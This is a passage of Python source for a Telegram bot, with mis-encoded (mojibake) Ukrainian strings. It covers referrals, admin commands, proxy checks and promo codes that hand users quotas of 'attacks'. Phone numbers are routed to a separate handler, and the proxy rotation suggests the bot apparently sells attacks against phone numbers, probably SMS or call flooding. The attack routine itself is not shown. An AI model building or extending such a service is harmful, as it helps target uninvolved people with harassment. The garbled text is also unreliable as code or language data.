                                referrer_exists = await conn.fetchval('SELECT 1 FROM users WHERE user_id = $1', referrer_id)
                                if not referrer_exists:
                                    referrer_id = None
                    
                    logging.info(f"–ó–Ω–∞–π–¥–µ–Ω–æ referrer_id: {referrer_id}")
                except Exception as e:
                    logging.error(f"–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –æ—Ç—Ä–∏–º–∞–Ω–Ω—ñ referrer_id: {e}")
                
                # –î–æ–¥–∞—î–º–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∏–º ID, —è–∫—â–æ —î
                await add_user(callback_query.from_user.id, callback_query.from_user.full_name, callback_query.from_user.username, referrer_id)
                
                # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —á–∏ –¥–æ—Å—è–≥–Ω—É—Ç–æ 20 —Ä–µ—Ñ–µ—Ä–∞–ª—ñ–≤ –¥–ª—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∞–¥–º—ñ–Ω—É
                if referrer_id:
                    referrer_data = await conn.fetchrow(
                        'SELECT referral_count, referral_notification_sent FROM users WHERE user_id = $1',
                        referrer_id
                    )
                    
                    if (referrer_data and 
                        referrer_data['referral_count'] >= 20 and 
                        not referrer_data['referral_notification_sent']):
                        for admin_id in ADMIN:
                            try:
                                await bot.send_message(
                                    admin_id,
                                    f"üéâ –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á <a href='tg://user?id={referrer_id}'>@{callback_query.from_user.username or 'User'}</a> –¥–æ—Å—è–≥–Ω—É–≤ 20 —Ä–µ—Ñ–µ—Ä–∞–ª—ñ–≤!",
                                    parse_mode='HTML'
                                )
                                await conn.execute(
                                    'UPDATE users SET referral_notification_sent = TRUE WHERE user_id = $1',
                                    referrer_id
                                )
                            except Exception as e:
                                logging.error(f"–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—ñ –∞–¥–º—ñ–Ω—É {admin_id}: {e}")
                
                welcome_text = f"üéâ –õ–∞—Å–∫–∞–≤–æ –ø—Ä–æ—Å–∏–º–æ, {callback_query.from_user.first_name}!\n\n"
                welcome_text += "üéØ –í–∏ —É—Å–ø—ñ—à–Ω–æ –ø—ñ–¥–ø–∏—Å–∞–ª–∏—Å—è —ñ —Ç–µ–ø–µ—Ä –º–æ–∂–µ—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ç–∏—Å—è –±–æ—Ç–æ–º.\n\n"
                
                await callback_query.message.edit_text(welcome_text, parse_mode='HTML')
                await callback_query.message.answer("–û–±–µ—Ä—ñ—Ç—å –¥—ñ—é:", reply_markup=profile_keyboard)
            else:
                welcome_text = f"üéâ –ó –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è–º, –¥—É–∂–µ –Ω–∞ —Ç–µ–±–µ —á–µ–∫–∞–ª–∏, {callback_query.from_user.first_name}!\n\n"
                welcome_text = '–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –±–æ—Ç–∞ –≤–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø–æ–≥–æ–¥–∂—É—î—Ç–µ—Å—å –∑ <a href="https://telegra.ph/Umovi-vikoristannya-10-26-2">—É–º–æ–≤–∞–º–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è</a>\n\n'

                
                await callback_query.message.edit_text(welcome_text, parse_mode='HTML')
                await callback_query.message.answer("–û–±–µ—Ä—ñ—Ç—å –¥—ñ—é:", reply_markup=profile_keyboard)
    else:
        await callback_query.answer("–í–∏ —â–µ –Ω–µ –ø—ñ–¥–ø–∏—Å–∞–ª–∏—Å—è –Ω–∞ –∫–∞–Ω–∞–ª!", show_alert=True)

@dp.message_handler(commands=['admin'])
async def admin(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer(f'{message.from_user.first_name}, –æ–±–µ—Ä—ñ—Ç—å –¥—ñ—éüëá', reply_markup=admin_keyboard)
    else:
        await message.answer('‚òùÔ∏è–í–∏ –Ω–µ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä')

@dp.message_handler(text="–ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –ø—Ä–æ–∫—Å—ñ")
async def admin_check_and_report_proxies(message: Message):
    if message.from_user.id not in ADMIN:
        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∞–≤.")
        return
    placeholder = await message.answer("–ü–µ—Ä–µ–≤—ñ—Ä—è—é –ø—Ä–æ–∫—Å—ñ‚Ä¶")
    stats = await check_and_update_proxies()
    lines = [f"–ü–µ—Ä–µ–≤—ñ—Ä–µ–Ω–æ: {stats['total']}. –†–æ–±–æ—á–∏—Ö: {stats['healthy']}.", ""]
    total_usage = sum(proxies_usage.values()) or 1
    for item in proxies_stats:
        e = item["entry"]
        key = f"{e['host']}:{e['port']}:{e['user']}"
        cnt = proxies_usage.get(key, 0)
        pct = round(cnt * 100.0 / total_usage, 1)
        lines.append(f"‚Ä¢ {e['host']}:{e['port']} ({e['user']}) ‚Äî {int(item['latency_ms'])} ms ‚Äî –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è: {pct}%")
    try:
        await bot.edit_message_text("\n".join(lines), chat_id=placeholder.chat.id, message_id=placeholder.message_id)
    except Exception:
        await message.answer("\n".join(lines))

# –ü–†–û–ú–û–ö–û–î–´ - –ê–î–ú–ò–ù –ü–ê–ù–ï–õ–¨

@dp.message_handler(text="–°—Ç–≤–æ—Ä–∏—Ç–∏ –ø—Ä–æ–º–æ–∫–æ–¥")
async def create_promo_start(message: Message):
    if message.from_user.id in ADMIN:
        await Dialog.create_promo_attacks.set()
        await message.answer("üéÅ <b>–°—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø—Ä–æ–º–æ–∫–æ–¥—É</b>\n\n–í–≤–µ–¥—ñ—Ç—å –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∞—Ç–∞–∫ –¥–ª—è –ø—Ä–æ–º–æ–∫–æ–¥—É:\n\nüí° –í–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç–∏ <b>–°–∫–∞—Å—É–≤–∞—Ç–∏</b> –¥–ª—è –≤—ñ–¥–º—ñ–Ω–∏.", parse_mode="html")
    else:
        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∞–≤.")

@dp.message_handler(state=Dialog.create_promo_attacks)
async def create_promo_attacks(message: Message, state: FSMContext):
    text = message.text.strip()
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ –Ω–∞ —Å–∫–∞—Å—É–≤–∞–Ω–Ω—è
    if text.lower() in ['—Å–∫–∞—Å—É–≤–∞—Ç–∏', '–æ—Ç–º–µ–Ω–∞', '–æ—Ç–º—ñ–Ω–∏—Ç–∏', 'cancel']:
        await state.finish()
        await message.answer("‚ùå –û–ø–µ—Ä–∞—Ü—ñ—é —Å–∫–∞—Å–æ–≤–∞–Ω–æ.", reply_markup=profile_keyboard)
        return
    
    try:
        attacks = int(text)
        if attacks <= 0:
            await message.answer("‚ùå –ö—ñ–ª—å–∫—ñ—Å—Ç—å –∞—Ç–∞–∫ –º–∞—î –±—É—Ç–∏ –±—ñ–ª—å—à–µ 0.\n\n–í–≤–µ–¥—ñ—Ç—å —á–∏—Å–ª–æ –∞–±–æ –Ω–∞–ø–∏—à—ñ—Ç—å <b>–°–∫–∞—Å—É–≤–∞—Ç–∏</b> –¥–ª—è –≤—ñ–¥–º—ñ–Ω–∏.", parse_mode="html")
            return
        
        await state.update_data(attacks=attacks)
        await Dialog.create_promo_hours.set()
        await message.answer("‚è∞ –í–≤–µ–¥—ñ—Ç—å —Å—Ç—Ä–æ–∫ –¥—ñ—ó –ø—Ä–æ–º–æ–∫–æ–¥—É –≤ –≥–æ–¥–∏–Ω–∞—Ö (—á–∞—Å, –ø—Ä–æ—Ç—è–≥–æ–º —è–∫–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑–º–æ–∂—É—Ç—å –≤–≤–µ—Å—Ç–∏ –ø—Ä–æ–º–æ–∫–æ–¥) –ß–ê–° –ú–ê–Ñ –ë–£–¢–ò +3 –ì–û–î–ò–ù–ò –í–Ü–î –ü–û–¢–†–Ü–ë–ù–û–ì–û:\n\nüí° –ù–∞–ø–∏—à—ñ—Ç—å <b>–°–∫–∞—Å—É–≤–∞—Ç–∏</b> –¥–ª—è –≤—ñ–¥–º—ñ–Ω–∏.", parse_mode="html")
    except ValueError:
        await message.answer("‚ùå –í–≤–µ–¥—ñ—Ç—å –∫–æ—Ä–µ–∫—Ç–Ω–µ —á–∏—Å–ª–æ.\n\n–°–ø—Ä–æ–±—É–π—Ç–µ —â–µ —Ä–∞–∑ –∞–±–æ –Ω–∞–ø–∏—à—ñ—Ç—å <b>–°–∫–∞—Å—É–≤–∞—Ç–∏</b> –¥–ª—è –≤—ñ–¥–º—ñ–Ω–∏.", parse_mode="html")

@dp.message_handler(state=Dialog.create_promo_hours)
async def create_promo_hours(message: Message, state: FSMContext):
    text = message.text.strip()
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ –Ω–∞ —Å–∫–∞—Å—É–≤–∞–Ω–Ω—è
    if text.lower() in ['—Å–∫–∞—Å—É–≤–∞—Ç–∏', '–æ—Ç–º–µ–Ω–∞', '–æ—Ç–º—ñ–Ω–∏—Ç–∏', 'cancel']:
        await state.finish()
        await message.answer("‚ùå –û–ø–µ—Ä–∞—Ü—ñ—é —Å–∫–∞—Å–æ–≤–∞–Ω–æ.", reply_markup=profile_keyboard)
        return
    
    try:
        hours = int(text)
        if hours <= 0:
            await message.answer("‚ùå –ö—ñ–ª—å–∫—ñ—Å—Ç—å –≥–æ–¥–∏–Ω –º–∞—î –±—É—Ç–∏ –±—ñ–ª—å—à–µ 0.\n\n–í–≤–µ–¥—ñ—Ç—å —á–∏—Å–ª–æ –∞–±–æ –Ω–∞–ø–∏—à—ñ—Ç—å <b>–°–∫–∞—Å—É–≤–∞—Ç–∏</b> –¥–ª—è –≤—ñ–¥–º—ñ–Ω–∏.", parse_mode="html")
            return
        
        data = await state.get_data()
        attacks = data['attacks']
        
        # –ì–µ–Ω–µ—Ä—É—î–º–æ —É–Ω—ñ–∫–∞–ª—å–Ω–∏–π –ø—Ä–æ–º–æ–∫–æ–¥
        async with db_pool.acquire() as conn:
            while True:
                promo_code = generate_promo_code()
                existing = await conn.fetchval('SELECT 1 FROM promocodes WHERE code = $1', promo_code)
                if not existing:
                    break
            
            # –°—Ç–≤–æ—Ä—é—î–º–æ –ø—Ä–æ–º–æ–∫–æ–¥
            valid_until = datetime.now() + timedelta(hours=hours)
            await conn.execute(
                'INSERT INTO promocodes (code, attacks_count, valid_until) VALUES ($1, $2, $3)',
                promo_code, attacks, valid_until
            )
        
        await message.answer(
            f"‚úÖ –ü—Ä–æ–º–æ–∫–æ–¥ —Å—Ç–≤–æ—Ä–µ–Ω–æ!\n\n"
            f"üéÅ –ö–æ–¥: <code>{promo_code}</code>\n"
            f"‚öîÔ∏è –ê—Ç–∞–∫: {attacks}\n"
            f"‚è∞ –î—ñ—î –¥–æ: {valid_until.strftime('%d.%m.%Y %H:%M')}\n"
            f"üìù –ü—Ä–æ–º–æ–∫–æ–¥ –º–æ–∂–Ω–∞ –≤–≤–µ—Å—Ç–∏ –ø—Ä–æ—Ç—è–≥–æ–º {hours} –≥–æ–¥–∏–Ω\n"
            f"üïê –ü—ñ—Å–ª—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –¥—ñ—î 24 –≥–æ–¥–∏–Ω–∏",
            parse_mode='HTML',
            reply_markup=profile_keyboard
        )
        
        await state.finish()
    except ValueError:
        await message.answer("‚ùå –í–≤–µ–¥—ñ—Ç—å –∫–æ—Ä–µ–∫—Ç–Ω–µ —á–∏—Å–ª–æ.\n\n–°–ø—Ä–æ–±—É–π—Ç–µ —â–µ —Ä–∞–∑ –∞–±–æ –Ω–∞–ø–∏—à—ñ—Ç—å <b>–°–∫–∞—Å—É–≤–∞—Ç–∏</b> –¥–ª—è –≤—ñ–¥–º—ñ–Ω–∏.", parse_mode="html")

@dp.message_handler(text="–í–∏–¥–∞–ª–∏—Ç–∏ –ø—Ä–æ–º–æ–∫–æ–¥")
async def delete_promo_start(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            promos = await conn.fetch('SELECT code, attacks_count, valid_until FROM promocodes WHERE is_active = TRUE ORDER BY created_at DESC')
        
        if not promos:
            await message.answer("–ù–µ–º–∞—î –∞–∫—Ç–∏–≤–Ω–∏—Ö –ø—Ä–æ–º–æ–∫–æ–¥—ñ–≤ –¥–ª—è –≤–∏–¥–∞–ª–µ–Ω–Ω—è.")
            return
        
        text = "üóëÔ∏è –ê–∫—Ç–∏–≤–Ω—ñ –ø—Ä–æ–º–æ–∫–æ–¥–∏:\n\n"
        for promo in promos:
            text += f"‚Ä¢ <code>{promo['code']}</code> - {promo['attacks_count']} –∞—Ç–∞–∫ (–¥–æ {promo['valid_until'].strftime('%d.%m.%Y %H:%M')})\n"
        
        text += "\n–í–≤–µ–¥—ñ—Ç—å –∫–æ–¥ –ø—Ä–æ–º–æ–∫–æ–¥—É –¥–ª—è –≤–∏–¥–∞–ª–µ–Ω–Ω—è:\n\nüí° –í–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç–∏ <b>–°–∫–∞—Å—É–≤–∞—Ç–∏</b> –¥–ª—è –≤—ñ–¥–º—ñ–Ω–∏."
        
        await Dialog.delete_promo.set()
        await message.answer(text, parse_mode='HTML')
    else:
        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∞–≤.")

@dp.message_handler(state=Dialog.delete_promo)
async def delete_promo_process(message: Message, state: FSMContext):
    promo_code = message.text.strip()
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ –Ω–∞ —Å–∫–∞—Å—É–≤–∞–Ω–Ω—è
    if promo_code.lower() in ['—Å–∫–∞—Å—É–≤–∞—Ç–∏', '–æ—Ç–º–µ–Ω–∞', '–æ—Ç–º—ñ–Ω–∏—Ç–∏', 'cancel']:
        await state.finish()
        await message.answer("‚ùå –û–ø–µ—Ä–∞—Ü—ñ—é —Å–∫–∞—Å–æ–≤–∞–Ω–æ.", reply_markup=profile_keyboard)
        return
    
    promo_code = promo_code.upper()
    
    async with db_pool.acquire() as conn:
        # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ —ñ—Å–Ω—É–≤–∞–Ω–Ω—è –ø—Ä–æ–º–æ–∫–æ–¥—É
        promo = await conn.fetchrow('SELECT * FROM promocodes WHERE code = $1 AND is_active = TRUE', promo_code)
        
        if not promo:
            await message.answer("‚ùå –ü—Ä–æ–º–æ–∫–æ–¥ –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ –∞–±–æ –≤–∂–µ –≤–∏–¥–∞–ª–µ–Ω–æ.\n\n–í–≤–µ–¥—ñ—Ç—å –∫–æ–¥ –∞–±–æ –Ω–∞–ø–∏—à—ñ—Ç—å <b>–°–∫–∞—Å—É–≤–∞—Ç–∏</b> –¥–ª—è –≤—ñ–¥–º—ñ–Ω–∏.", parse_mode="html")
            return
        
        # –î–µ–∞–∫—Ç–∏–≤—É—î–º–æ –ø—Ä–æ–º–æ–∫–æ–¥
        await conn.execute('UPDATE promocodes SET is_active = FALSE WHERE code = $1', promo_code)
    
    await message.answer(f"‚úÖ –ü—Ä–æ–º–æ–∫–æ–¥ <code>{promo_code}</code> —É—Å–ø—ñ—à–Ω–æ –≤–∏–¥–∞–ª–µ–Ω–æ!", parse_mode='HTML', reply_markup=profile_keyboard)
    await state.finish()

@dp.message_handler(text="–°–ø–∏—Å–æ–∫ –ø—Ä–æ–º–æ–∫–æ–¥—ñ–≤")
async def list_promos(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            promos = await conn.fetch('''
                SELECT code, attacks_count, valid_until, created_at, is_active,
                       (SELECT COUNT(*) FROM promo_activations WHERE promo_code = code) as used_count
                FROM promocodes 
                ORDER BY created_at DESC
            ''')
        
        if not promos:
            await message.answer("–ü—Ä–æ–º–æ–∫–æ–¥—ñ–≤ –ø–æ–∫–∏ —â–æ –Ω–µ–º–∞—î.")
            return
        
        text = "üìã <b>–í—Å—ñ –ø—Ä–æ–º–æ–∫–æ–¥–∏:</b>\n\n"
        
        for promo in promos:
            status = "üü¢ –ê–∫—Ç–∏–≤–Ω–∏–π" if promo['is_active'] else "üî¥ –í–∏–¥–∞–ª–µ–Ω–æ"
            if promo['is_active'] and datetime.now() > promo['valid_until']:
                status = "‚è∞ –ó–∞–∫—ñ–Ω—á–∏–≤—Å—è"
            
            text += f"‚Ä¢ <code>{promo['code']}</code>\n"
            text += f"  ‚öîÔ∏è –ê—Ç–∞–∫: {promo['attacks_count']}\n"
            text += f"  üìÖ –°—Ç–≤–æ—Ä–µ–Ω–æ: {promo['created_at'].strftime('%d.%m.%Y %H:%M')}\n"
            text += f"  ‚è∞ –î–æ: {promo['valid_until'].strftime('%d.%m.%Y %H:%M')}\n"
            text += f"  üë• –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ: {promo['used_count']} —Ä–∞–∑—ñ–≤\n"
            text += f"  üìä –°—Ç–∞—Ç—É—Å: {status}\n\n"
        
        await message.answer(text, parse_mode='HTML')
    else:
        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∞–≤.")

# –ü–†–û–ú–û–ö–û–î–´ - –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–ò

@dp.message_handler(text='üéÅ –£ –º–µ–Ω–µ —î –ø—Ä–æ–º–æ–∫–æ–¥')
@dp.throttled(anti_flood, rate=3)
async def promo_handler(message: types.Message):
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ —á–∞—Ç—É
    if message.chat.type != 'private':
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞—Ç–∏—Å–Ω—É—Ç–∏ /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("–í–∞—Å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ —ñ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ç–∏—Å—è –±–æ—Ç–æ–º.")
        return

    if not await check_subscription_status(user_id):
        await message.answer("–í–∏ –≤—ñ–¥–ø–∏—Å–∞–ª–∏—Å—è –≤—ñ–¥ –∫–∞–Ω–∞–ª—É. –ü—ñ–¥–ø–∏—à—ñ—Ç—å—Å—è, —â–æ–± –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –±–æ—Ç–∞.", reply_markup=checkSubMenu)
        return
    
    await Dialog.enter_promo.set()
    await message.answer("üéÅ –í–≤–µ–¥—ñ—Ç—å –ø—Ä–æ–º–æ–∫–æ–¥:\n\nüí° –ü—Ä–æ–º–æ–∫–æ–¥ —Å–∫–ª–∞–¥–∞—î—Ç—å—Å—è —Ç—ñ–ª—å–∫–∏ –∑ –±—É–∫–≤ —Ç–∞ —Ü–∏—Ñ—Ä. –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É –Ω–µ —î –ø—Ä–æ–º–æ–∫–æ–¥–æ–º.")

@dp.message_handler(state=Dialog.enter_promo)
async def process_promo(message: Message, state: FSMContext):
    user_id = message.from_user.id
    text = message.text.strip()
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —á–∏ —Ü–µ –Ω–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É (—è–∫—â–æ –º—ñ—Å—Ç–∏—Ç—å –±–∞–≥–∞—Ç–æ —Ü–∏—Ñ—Ä —ñ —Å—Ö–æ–∂–µ –Ω–∞ –Ω–æ–º–µ—Ä)
    number_test = re.sub(r'\D', '', text)
    if len(number_test) >= 9:  # –Ø–∫—â–æ 9+ —Ü–∏—Ñ—Ä - —Ü–µ —Å–∫–æ—Ä—ñ—à–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É
        # –°–∫–∏–¥–∞—î–º–æ —Å—Ç–∞–Ω —ñ –≤–∏–∫–ª–∏–∫–∞—î–º–æ –æ–±—Ä–æ–±–Ω–∏–∫ –Ω–æ–º–µ—Ä—ñ–≤
        await state.finish()
        # –í–∏–∫–ª–∏–∫–∞—î–º–æ –æ–±—Ä–æ–±–Ω–∏–∫ –Ω–æ–º–µ—Ä—ñ–≤ –Ω–∞–ø—Ä—è–º—É
        await handle_phone_number(message, state)
        return
    
    promo_code = text.upper()
    
    async with db_pool.acquire() as conn:
        # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ —ñ—Å–Ω—É–≤–∞–Ω–Ω—è —Ç–∞ –∞–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å –ø—Ä–æ–º–æ–∫–æ–¥—É
        promo = await conn.fetchrow('''
            SELECT * FROM promocodes 
            WHERE code = $1 AND is_active = TRUE AND valid_until > $2
        ''', promo_code, datetime.now())
        
        if not promo:
            await message.answer("‚ùå –ü—Ä–æ–º–æ–∫–æ–¥ –Ω–µ–¥—ñ–π—Å–Ω–∏–π –∞–±–æ –∑–∞–∫—ñ–Ω—á–∏–≤—Å—è —Å—Ç—Ä–æ–∫ –π–æ–≥–æ –¥—ñ—ó.")
            await state.finish()
            return
        
        # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —á–∏ –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤–∂–µ —Ü–µ–π –ø—Ä–æ–º–æ–∫–æ–¥
        already_used = await conn.fetchval('''
            SELECT 1 FROM promo_activations 
            WHERE user_id = $1 AND promo_code = $2
        ''', user_id, promo_code)
        
        if already_used:
            await message.answer("‚ùå –í–∏ –≤–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–ª–∏ —Ü–µ–π –ø—Ä–æ–º–æ–∫–æ–¥.")
            await state.finish()
            return
        
        # –ê–∫—Ç–∏–≤—É—î–º–æ –ø—Ä–æ–º–æ–∫–æ–¥
        expires_at = datetime.now() + timedelta(hours=24)
        
        await conn.execute('''
            INSERT INTO promo_activations (user_id, promo_code, expires_at, attacks_added)
            VALUES ($1, $2, $3, $4)
        ''', user_id, promo_code, expires_at, promo['attacks_count'])
        
        # –î–æ–¥–∞—î–º–æ –∞—Ç–∞–∫–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É
        await conn.execute('''
            UPDATE users SET promo_attacks = promo_attacks + $1 WHERE user_id = $2
        ''', promo['attacks_count'], user_id)
    
    await message.answer(
        f"üéâ –ü—Ä–æ–º–æ–∫–æ–¥ —É—Å–ø—ñ—à–Ω–æ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–æ!\n\n"
        f"‚öîÔ∏è –î–æ–¥–∞–Ω–æ –∞—Ç–∞–∫: {promo['attacks_count']}\n"
        f"‚è∞ –î—ñ—î –¥–æ: {expires_at.strftime('%d.%m.%Y %H:%M')}\n\n"
        f"üí° –ê—Ç–∞–∫–∏ –≤—ñ–¥ –ø—Ä–æ–º–æ–∫–æ–¥—É –∑–≥–æ—Ä—è—Ç—å –ø—Ä–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π —â–æ–¥–µ–Ω–Ω—ñ–π —Ä–æ–∑–¥–∞—á—ñ –∞—Ç–∞–∫.",
        parse_mode='HTML'
    )
    
    await state.finish()

# –û—Å—Ç–∞–ª—å–Ω—ã–µ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏...

@dp.message_handler(text="–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞")
async def bot_stats(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            # –û—Ç—Ä–∏–º—É—î–º–æ –∑–∞–≥–∞–ª—å–Ω—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
            total_users = await conn.fetchval('SELECT COUNT(*) FROM users')
            
            # –û—Ç—Ä–∏–º—É—î–º–æ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∞–∫—Ç–∏–≤–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (—Ç–∏—Ö, —Ö—Ç–æ –Ω–µ –∑–∞–±–ª–æ–∫—É–≤–∞–≤ –±–æ—Ç–∞)
            active_users = 0
            users = await conn.fetch('SELECT user_id FROM users')
            
            for user in users:
                try:
                    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —á–∏ –º–æ–∂–µ –±–æ—Ç –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É
                    await bot.send_chat_action(user['user_id'], 'typing')
                    active_users += 1
                except (BotBlocked, UserDeactivated, ChatNotFound):
                    continue
                except Exception as e:
                    logging.error(f"–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–≤—ñ—Ä—Ü—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ {user['user_id']}: {e}")
                    continue
            
            # –û—Ç—Ä–∏–º—É—î–º–æ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
            blocked_users = await conn.fetchval('SELECT COUNT(*) FROM users WHERE block = 1')
            
            # –û—Ç—Ä–∏–º—É—î–º–æ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ —Ä–µ—Ñ–µ—Ä–∞–ª–∞–º–∏
            users_with_referrals = await conn.fetchval('SELECT COUNT(*) FROM users WHERE referral_count > 0')
            
            # –û—Ç—Ä–∏–º—É—î–º–æ –∑–∞–≥–∞–ª—å–Ω—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Ä–µ—Ñ–µ—Ä–∞–ª—ñ–≤
            total_referrals = await conn.fetchval('SELECT COUNT(*) FROM referrals')
            
            # –û—Ç—Ä–∏–º—É—î–º–æ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —è–∫—ñ –¥–æ—Å—è–≥–ª–∏ 20 —Ä–µ—Ñ–µ—Ä–∞–ª—ñ–≤
            vip_users = await conn.fetchval('SELECT COUNT(*) FROM users WHERE referral_count >= 20')
            
            # –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø—Ä–æ–º–æ–∫–æ–¥–æ–≤
            total_promos = await conn.fetchval('SELECT COUNT(*) FROM promocodes')
            active_promos = await conn.fetchval('SELECT COUNT(*) FROM promocodes WHERE is_active = TRUE AND valid_until > $1', datetime.now())
            promo_activations = await conn.fetchval('SELECT COUNT(*) FROM promo_activations')
        
        message_text = (
            f"üìä <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞</b>\n\n"
            f"üë• –í—Å—å–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤: {total_users}\n"
            f"‚úÖ –ê–∫—Ç–∏–≤–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤: {active_users}\n"
            f"üö´ –ó–∞–±–ª–æ–∫–æ–≤–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤: {blocked_users}\n"
            f"üìà –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑ —Ä–µ—Ñ–µ—Ä–∞–ª–∞–º–∏: {users_with_referrals}\n"
            f"üîó –í—Å—å–æ–≥–æ —Ä–µ—Ñ–µ—Ä–∞–ª—ñ–≤: {total_referrals}\n"
            f"‚≠ê VIP –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (20+ —Ä–µ—Ñ–µ—Ä–∞–ª—ñ–≤): {vip_users}\n\n"
            f"üéÅ <b>–ü—Ä–æ–º–æ–∫–æ–¥–∏:</b>\n"
            f"üìã –í—Å—å–æ–≥–æ —Å—Ç–≤–æ—Ä–µ–Ω–æ: {total_promos}\n"
            f"üü¢ –ê–∫—Ç–∏–≤–Ω–∏—Ö: {active_promos}\n"
            f"‚ú® –ê–∫—Ç–∏–≤–∞—Ü—ñ–π: {promo_activations}"
        )
        
        await message.answer(message_text, parse_mode="HTML")
    else:
